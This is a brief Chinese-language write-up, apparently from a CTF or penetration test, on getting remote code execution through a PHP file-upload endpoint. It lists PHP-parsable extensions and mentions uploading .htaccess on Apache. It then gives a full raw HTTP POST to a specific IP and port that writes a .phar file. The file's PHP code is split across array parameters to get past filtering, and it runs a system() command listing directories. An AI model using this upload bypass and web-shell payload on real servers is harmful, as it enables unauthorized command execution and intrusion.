如果能上传能被 PHP 解析的文件后缀，即可 RCE。
能解析的后缀：

php
pht
phar
...

目标服务器是 Apache
上传 .htaccess


```
POST / HTTP/1.1
Host: 139.9.251.90:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

file=1.phar&content[]=<&content[]=?&content[]=php&content[]=+&content[]=system("ls+-alR+../");
```